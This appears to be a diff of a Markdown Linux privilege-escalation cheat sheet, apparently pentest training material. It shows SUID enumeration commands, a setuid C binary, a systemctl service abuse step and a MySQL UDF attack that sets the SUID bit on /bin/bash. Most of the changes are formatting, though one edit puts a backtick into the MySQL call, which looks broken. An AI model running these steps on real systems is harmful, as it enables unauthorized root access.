@@ -461,10 +461,8 @@ find / -perm -g=s -type f 2>/dev/null | xargs ls -l
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 find / -uid 0 -perm -4000 -type f 2>/dev/null 
 
-// Look for any binaries that seem odd. Any binaries running from a users home directory?
-// Check the version of any odd binaries and see if there are any public exploits that can be used to gain root
-
-
+# Look for any binaries that seem odd. Any binaries running from a users home directory?
+# Check the version of any odd binaries and see if there are any public exploits that can be used to gain root
 ```
 
 # SUID PATH Environmental Variable
@@ -488,16 +486,17 @@ test.c:
 
 ```c
 #include<unistd.h>
-void main()
-{ setuid(0);
-  setgid(0);
-  system("curl -I 127.0.0.1");
 
-  }
+void main()
+{ 
+    setuid(0);
+    setgid(0);
+    system("curl -I 127.0.0.1");
+}
 ```
 Compile Binary & Add SUID Bit
 
-```
+```sh
 gcc test.c -o network-tester
 chmod u+s network-tester
 mv network-tester /bin/tools/
@@ -588,7 +587,7 @@ Example 5 (/bin/systemctl)
 Privilege Escalation
 
 Copy line by line inside the victim low priv shell
-```
+```sh
 TF=$(mktemp).service
 echo '[Service]
 Type=oneshot
@@ -1148,10 +1147,10 @@ mysql -u root -p
 
 ```mysql
 mysql> create table priv(line blob);
-mysql> insert into priv values(load_file(‘/tmp/priv.so’));
-mysql> select * from priv into dumpfile ‘/usr/lib/mysql/plugin/priv.so’;
-mysql> create function do_system returns integer soname ‘priv.so’;
-mysql> select do_system(‘chmod +s /bin/bash’);
+mysql> insert into priv values(load_file('/tmp/priv.so'));
+mysql> select * from priv into dumpfile '/usr/lib/mysql/plugin/priv.so';
+mysql> create function do_system returns integer soname 'priv.so';
+mysql> select do_system(`chmod +s /bin/bash`);
 mysql>!sh
 ```
 
